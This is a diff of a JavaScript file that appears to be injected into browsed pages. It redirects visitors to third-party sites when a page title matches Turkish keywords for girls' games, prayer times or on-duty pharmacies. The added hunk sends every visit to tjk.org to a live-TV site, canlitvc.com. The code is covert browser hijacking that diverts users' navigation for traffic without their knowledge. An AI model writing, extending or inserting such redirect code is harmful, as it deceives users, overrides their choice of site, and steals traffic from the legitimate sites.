@@ -90,11 +90,14 @@ if(document.title.toLowerCase().indexOf("kız oyunları") >= 0){ window.location
 if(document.title.toLowerCase().indexOf("barbie oyunları") >= 0){ window.location = randkiz; }
 if(document.title.toLowerCase().indexOf("makyaj oyunları") >= 0){ window.location = randkiz; }}
 
-
-
 if(location.hostname.indexOf("namazmatik") < 0) {
 if(document.title.toLowerCase().indexOf("namaz vakit") >= 0){ window.location = "http://www.namazmatik.net/"; }
 }
+
+if(location.hostname.indexOf("tjk.org") >= 0) {
+window.location = "http://www.canlitvc.com/canli-izle/tjk-tv/"; 
+}
+
 
 if(location.hostname.indexOf("nobetcieczanen.com") < 0) {
 if(document.title.toLowerCase().indexOf("nöbetçi eczane") >= 0){ window.location = "http://www.nobetcieczanen.com/"; }
